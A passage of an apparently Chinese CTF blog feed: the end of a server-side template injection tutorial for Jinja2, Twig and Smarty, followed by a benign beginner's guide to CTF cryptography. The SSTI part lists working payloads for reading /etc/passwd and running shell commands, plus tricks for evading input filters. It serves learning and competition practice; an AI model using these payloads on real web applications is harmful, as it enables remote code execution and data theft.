&lt;p&gt;但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。&lt;/p&gt;
&lt;h2 id=&#34;常见模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见模板&#34;&gt;#&lt;/a&gt; 常见模板&lt;/h2&gt;
&lt;p&gt;下图为&lt;strong&gt;常见模板结构&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20200803104657237.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;1jinja2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1jinja2&#34;&gt;#&lt;/a&gt; 1.jinja2&lt;/h3&gt;
&lt;h4 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;常用函数&lt;/strong&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;__dict__            保存类实例或对象实例的属性变量键值对字典
__class__           返回类型所属的对象(返回调用的参数类型)
__mro__             返回一个包含对象所继承的基类元组(返回类型列表)，方法在解析时按照元组的顺序解析。
__bases__           返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__      每个新类都保留了子类的引用(返回object的子类)，这个方法返回一个类中仍然可用的的引用的列表
__init__            类的初始化方法
__globals__         对包含函数全局变量的字典的引用
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h4&gt;
&lt;p&gt;获取基本类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;&#39;.__class__.__mro__[2]
&amp;#123;&amp;#125;.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;获取基本类后，继续向下获取基本类 (object) 的子类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;object.__subclasses__()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;存在的子模块可以通过.index () 来进行查询，如果存在的话返回索引，直接调用即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;&#39;.__class__.__mro__[2].__subclasses__().index(file)
40
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后通过.read 读取文件即可（py2）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read() #将read() 修改为 write() 即为写文件
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;payload总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload总结&#34;&gt;#&lt;/a&gt; &lt;strong&gt;payload 总结&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;python2&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/etc/passwd&#39;).read()&amp;#125; &amp;#125;                             //文件读取

&amp;#123; &amp;#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;).read()&amp;#125; &amp;#125;              //文件读取

&amp;#123; &amp;#123;()[&amp;quot;\x5F\x5Fclass\x5F\x5F&amp;quot;][&amp;quot;\x5F\x5Fbases\x5F\x5F&amp;quot;][0][&amp;quot;\x5F\x5Fsubclasses\x5F\x5F&amp;quot;]()[91][&amp;quot;get\x5Fdata&amp;quot;](0, &amp;quot;app\x2Epy&amp;quot;)&amp;#125; &amp;#125;                                    

&amp;#123; &amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&amp;quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&amp;quot;)&amp;#125; &amp;#125;               //命令执行

&amp;#123; &amp;#123;()[&amp;quot;\x5F\x5Fclass\x5F\x5F&amp;quot;][&amp;quot;\x5F\x5Fbases\x5F\x5F&amp;quot;][0][&amp;quot;\x5F\x5Fsubclasses\x5F\x5F&amp;quot;]()[80][&amp;quot;load\x5Fmodule&amp;quot;](&amp;quot;os&amp;quot;)[&amp;quot;system&amp;quot;](&amp;quot;ls&amp;quot;)&amp;#125; &amp;#125;

&amp;#123; &amp;#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()&amp;#125; &amp;#125;                               //命令执行
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;python3&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//命令执行
&amp;#123; % for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123; &amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&amp;quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&amp;quot;) &amp;#125; &amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
//文件操作
&amp;#123; % for c in [].__class__.__base__.__subclasses__() % &amp;#125;&amp;#123; % if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123; &amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() &amp;#125; &amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拼接查找目录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; % for c in [].__class__.__base__.__subclasses__() % &amp;#125;&amp;#123; % if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123; &amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125; &amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查找根目录 -------------------------------&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; % for c in [].__class__.__base__.__subclasses__() % &amp;#125;&amp;#123; % if c.__name__==&#39;catch_warnings&#39; % &amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;)&amp;#125;&amp;#125;&amp;#123; % endif % &amp;#125;&amp;#123; % endfor % &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;开头的都是 class 什么的，说明是 python3 写的 flask。因为 py2 写的话，开头的都是 type。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;python2 下有 file 而在 python3 下已经没有了，所以是直接用 open。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;更详细的方法查看参考链接第五条    &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==&#34;&gt;浅析 SSTI (python 沙盒绕过)&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;常见绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见绕过&#34;&gt;#&lt;/a&gt; &lt;strong&gt;常见绕过&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;1. 绕过中括号&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;pop () 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这里使用 pop 并不会真的移除，但却能返回其值，取代中括号，来实现绕过。&lt;/p&gt;
&lt;p&gt;​		&lt;em&gt;&lt;strong&gt;2. 过滤引号&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;request.args&lt;/code&gt;  是 flask 中的一个属性，为返回请求的参数，这里把 &lt;code&gt;path&lt;/code&gt;  当作变量名，将后面的路径传值进来，进而绕过了引号的过滤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&amp;#125; &amp;#125;&amp;amp;pat
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;3. 过滤&lt;/strong&gt;&lt;/em&gt; { {&lt;em&gt;&lt;strong&gt;或者&lt;/strong&gt;&lt;/em&gt;}  }&lt;/p&gt;
&lt;p&gt;可以使用 { % 绕过，&lt;br&gt;
 &lt;code&gt;&amp;#123; %  % &amp;#125;&lt;/code&gt;  中间可以执行 if 语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; % if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/test&#39;).read()[0:1]==&#39;p&#39; % &amp;#125;1&amp;#123; % endif % &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​	&lt;strong&gt;4. 过滤_&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用编码绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__class__ =&amp;gt; \x5f\x5fclass\x5f\x5f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;_ 是 \x5f，. 是 \x2E      如果也过滤了&lt;/p&gt;
&lt;p&gt;可以用利用 &lt;code&gt;request.args&lt;/code&gt;  属性&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;#123; &amp;#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;/etc/passwd&#39;).read() &amp;#125; &amp;#125;&amp;amp;class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将其中的 &lt;code&gt;request.args&lt;/code&gt;  改为 &lt;code&gt;request.values&lt;/code&gt;  则利用 post 的方式进行传参&lt;/p&gt;
&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;5. 过滤.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;. 在 payload 中是很重要的，但是我们依旧可以采用 attr () 绕过&lt;br&gt;
举例&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;url?name=&amp;#123; &amp;#123;().__class__.__base__.__subclasses__[177].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;ipconfig&amp;quot;).read()&#39;)&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用 attr () 绕过：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)|attr(&#39;__subclasses__&#39;)()|attr(&#39;__getitem__&#39;)(177)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)(&#39;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;dir&amp;quot;).read()&#39;)&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;6. 绕过 config 参数&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;#123; &amp;#123;config&amp;#125; &amp;#125;&lt;/code&gt;  可以获取当前设置，如果题目类似&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那可以直接访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;config[&#39;FLAG&#39;]&amp;#125; &amp;#125;   或者   &amp;#123; &amp;#123;config.FLAG&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到 flag。但是如果被过滤了，则&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;self&amp;#125; &amp;#125; ⇒ &amp;lt;TemplateReference None&amp;gt;
&amp;#123; &amp;#123;self.__dict__._TemplateReference__context.config&amp;#125; &amp;#125; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同样可以找到 config&lt;/p&gt;
&lt;p&gt;​	&lt;em&gt;&lt;strong&gt;7. 关键字过滤&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;base64 编码绕过&lt;br&gt;
 &lt;code&gt;__getattribute__&lt;/code&gt; 使用实例访问属性时，调用该方法&lt;/p&gt;
&lt;p&gt;例如被过滤掉 &lt;code&gt;__class__&lt;/code&gt; 关键词&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&amp;quot;/etc/passwd&amp;quot;).read()&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;字符串拼接绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&amp;quot;/etc/passwd&amp;quot;).read()&amp;#125; &amp;#125; 
//不对就加join

&amp;#123; &amp;#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2smarty&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2smarty&#34;&gt;#&lt;/a&gt; 2.smarty&lt;/h3&gt;
&lt;p&gt;Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用  system ()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置  $SCRIPT_NAME)。&lt;/p&gt;
&lt;p&gt;参考文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lYjhkMDEzN2E3ZDM=&#34;&gt;ctf 中 smarty 介绍与例题&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;smarty，应用比较少。&lt;/p&gt;
&lt;h3 id=&#34;3twig&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3twig&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3.twig&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;文件读取&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;&#39;/etc/passwd&#39;|file_excerpt(1,30)&amp;#125; &amp;#125;

&amp;#123; &amp;#123;app.request.files.get(1).__construct(&#39;/etc/passwd&#39;,&#39;&#39;)&amp;#125; &amp;#125;
&amp;#123; &amp;#123;app.request.files.get(1).openFile.fread(99)&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;rce&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123; &amp;#123;_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)&amp;#125; &amp;#125;&amp;#123; &amp;#123;_self.env.getFilter(&amp;quot;id&amp;quot;)&amp;#125; &amp;#125;   （cat /flag ）

&amp;#123; &amp;#123;[&#39;cat /etc/passwd&#39;]|filter(&#39;system&#39;)&amp;#125; &amp;#125;

POST /subscribe?0=cat+/etc/passwd HTTP/1.1
&amp;#123; &amp;#123;app.request.query.filter(0,0,1024,&amp;#123;&#39;options&#39;:&#39;system&#39;&amp;#125;)&amp;#125; &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;4其他模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4其他模板&#34;&gt;#&lt;/a&gt; 4. 其他模板&lt;/h3&gt;
&lt;p&gt;参考链接    &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模板注入攻击 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对各个模板有讲解&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==&#34;&gt;服务端模板注入攻击 - 知乎 (zhihu.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI0NjgzMi5odG1s&#34;&gt;细说服务器端模板注入（SSTI） - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMTQyNTM2OC5odG1s&#34;&gt;CTF SSTI (服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzE4Nzg0NS5odG1s&#34;&gt;从零学习 flask 模板注入&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRpL2FydGljbGUvZGV0YWlscy8xMDc3NTI3MTc=&#34;&gt;SSTI 模板注入及绕过姿势 (基于 Python-Jinja2)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==&#34;&gt;浅析 SSTI (python 沙盒绕过)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDY2MzkxMTE=&#34;&gt;https://blog.csdn.net/qq_45521281/article/details/106639111&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;附：读者可辅助参考的文章&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHktLTEvcC8xMjg0MTk0MS5odG1s&#34;&gt;SSTI 学习&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="SSTI" />
        <updated>2021-11-23T11:57:15.038Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/10/23/ctf/crypto&amp;misc/cryptotal/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/</id>
        <title>CRYPTO——密码的取经之路</title>
        <link rel="alternate" href="http://imfanqie.top/2021/10/23/ctf/crypto&amp;misc/cryptotal/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/"/>
        <content type="html">&lt;p&gt;just an introduction for 1024CTF to beginner, I&#39;m also an amateur&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;welcome to 1024CTF !&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;这是一篇帮助你干掉密码的攻略，仔细阅读喔～&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;为什么写这篇文章why&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#为什么写这篇文章why&#34;&gt;#&lt;/a&gt; 为什么写这篇文章：Why&lt;/h2&gt;
&lt;p&gt;答：因为题出的有点有点难，密码题一般解题情况不是很乐观，因为大多依靠经验和网络。&lt;/p&gt;
&lt;p&gt;所以写这篇指南做一下简单介绍，帮你们排一下雷，快速入门&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;s&gt;ps：如果你对密码和其他方向都感兴趣，可以像我一样主攻其他的顺便搞一搞密码和杂项&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;​		战队缺密码手&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&#34;什么是密码学what&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是密码学what&#34;&gt;#&lt;/a&gt; &lt;strong&gt;什么是密码学：What&lt;/strong&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;** 顾名思义就是研究加密的学科。** 现代密码学要求在加密算法公开的情况下，只要不知道密钥，就无法对消息进行解密。这样的话，仅需要保护一个不算长的密钥即可保护一段信息；即使密钥泄露，换个密钥就能继续用同一个加密算法加密。所以，密码学就是要寻找一个在不知道密钥情况下无法破解的算法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 CTF 比赛中，密码学有难有易，简单题甚至不需要过脑子就可以解密出来，而往往重要比赛中，解密需要脚本的支持与配合，这就要求解题人掌握熟练地编程能力，灵活的思维和丰富的经验。相对而言密码学是一个比较容易入手的方向，只是需要时间的积淀，你也可以成为一名合格的密码手，并且逐渐享受密码学带给你的乐趣。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;学习密码学需要什么基础basis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#学习密码学需要什么基础basis&#34;&gt;#&lt;/a&gt; &lt;strong&gt;学习密码学需要什么基础：Basis&lt;/strong&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;数学基础&lt;/strong&gt;： 密码学是数学的一个应用学科，最早的公钥密码算法 RSA 就是基于数论的，因此学习密码学通常还需要从数论开始学起。其次，最早不是基于数学的块密码，在发展的过程中，也被运用数学的语言来描述，从而更能够更清晰的找到攻击方法。因此，学习密码学会涉及到大量的数学知识，欢迎对数学感兴趣（至少不讨厌）的同学来钻研学习&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;编程基础&lt;/strong&gt;： 现代密码学比古典密码复杂许多，它的加密解密算法不是人能够口算或者笔算出来的东西，因此也需要编程。而密码学由于经常要用到特别大的数字，远超 c 和 c++ 的 long long int 的上限，因此一般使用 python 编写程序。python 是一个较接近自然语言的编程语言，因此容易上手，灵活运用搜索引擎以及网上一些教程很容易学会。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;英语基础&lt;/strong&gt;： 你有可能会遇到一些需要阅读纯英文文章才能解决的题目，需要有一定的耐心才能看明白。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;害，不要被这些条件吓走，毕竟这是&lt;strong&gt;大佬水准&lt;/strong&gt;，而我只是一名 web 来兼任的密码的菜鸡，教不了你们这些...&lt;/p&gt;
&lt;p&gt;对于我们这种小白，或者是想在其他方向瓶颈时研究一下密码学，其实都不是很难，只需要从基础密码抓起，慢慢培养兴趣，逐渐就会有所收获，成为密码大佬！&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;常见密码分类classify&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见密码分类classify&#34;&gt;#&lt;/a&gt; &lt;strong&gt;常见密码分类：Classify&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;由于这是一篇赛前指南，我就不在此对密码详细介绍了，只做一下&lt;strong&gt;基本密码的分类&lt;/strong&gt;，详细的问题还要自己努力呀&lt;/p&gt;
&lt;p&gt;（请仔细阅读，部分题型就在这里）&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;新手常见密码分类：&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本古典密码：栅栏密码、埃特巴什码、凯撒密码、猪圈密码、Keyboard 密码、标准银河字母密码、圣堂武士密码、维吉尼亚密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本编码类密码：ASCII 编码、Base64/32/16 编码、莫尔斯电码、UUencode 编码、URL 编码、Unicode 编码、敲击码、MD5&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;花里胡哨可能出现但用处不多的密码：php 混淆加密、JSfuck、aaencode、brainfuck、ook 编码、emo 密码、base 全家桶系列&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其他可能出现的简单密码：ROT 系列、佛语论禅及其变形、价值观、猪圈及其变形等等（各种奇怪的我一时也想不起来）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;简单脚本类：常见的 RSA 求解、常见的编码转换求解、自加密算法脚本求解等&lt;/p&gt;
&lt;hr&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;密码学工具及准备toolspre&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码学工具及准备toolspre&#34;&gt;#&lt;/a&gt; &lt;strong&gt;密码学工具及准备：Tools&lt;/strong&gt;&amp;amp;Pre&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;python 及其对应的一堆库&lt;/li&gt;
&lt;li&gt;一些自己大佬编写的密码工具&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;python 请自行配置，推荐 3.7 以上版本，请确保 pip 正常使用。平时积累的脚本可以收集起来，可能会反复使用&lt;/p&gt;
&lt;p&gt;建议多刷题，在无聊的时间里，养成基本密码一眼看出的水平。&lt;/p&gt;
&lt;p&gt;了解 rsa 算法，rsa 在密码方向占了重要位置&lt;/p&gt;
&lt;p&gt;多收藏大佬的网站和帖子，多找总结帖，说不定就用上了&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;做题的基本步骤step&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#做题的基本步骤step&#34;&gt;#&lt;/a&gt; &lt;strong&gt;做题的基本步骤：Step&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;不要慌，先冷静五秒&lt;/li&gt;
&lt;li&gt;看看格式有印象吗&lt;/li&gt;
&lt;li&gt;如果没有就看描述，有就去尝试&lt;/li&gt;
&lt;li&gt;如果还是不知道就用常见的试试，或者找大佬的密码总结帖，看看是否有帮助&lt;/li&gt;
&lt;li&gt;尝试到你不想做了，或者搞到 flag&lt;/li&gt;
&lt;li&gt;再不行就看 wp 写 wp 吧&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;写在最后last&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写在最后last&#34;&gt;#&lt;/a&gt; 写在最后：Last&lt;/h2&gt;
&lt;p&gt;密码能给你在其他方向做到痛不欲生时带来一丝惊喜（上分快），通常密码和杂项配合起来有奇效（上分非常快）&lt;/p&gt;
&lt;p&gt;密码学是信安和网安的必修专业课，学会了你就领先别人一手，一举两得～&lt;/p&gt;
&lt;p&gt;但是学习 crypto 的人很少，一开始学习密码学必有许多艰难险阻...&lt;/p&gt;
&lt;p&gt;一路下来，会有不少人放弃...&lt;/p&gt;
&lt;p&gt;但是如果你带着&lt;strong&gt;兴趣&lt;/strong&gt;，坚持下来，必然会有效果不错的收获！&lt;/p&gt;
&lt;p&gt;在比赛的 CTFER 们，&lt;/p&gt;
&lt;p&gt;加油冲，XJUSEC 等你哟～&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在经历过风吹雨打之后，当第一缕的阳光投射到你疲劳憔悴的脸庞时，你会感到欣喜若狂。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​																																												Written by 一名废物 web 选手&lt;/p&gt;
</content>
        <category term="业余爱好" />
        <updated>2021-10-23T02:44:00.030Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/08/28/ctf/match/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</id>
        <title>xjusec考核赛解题过程</title>
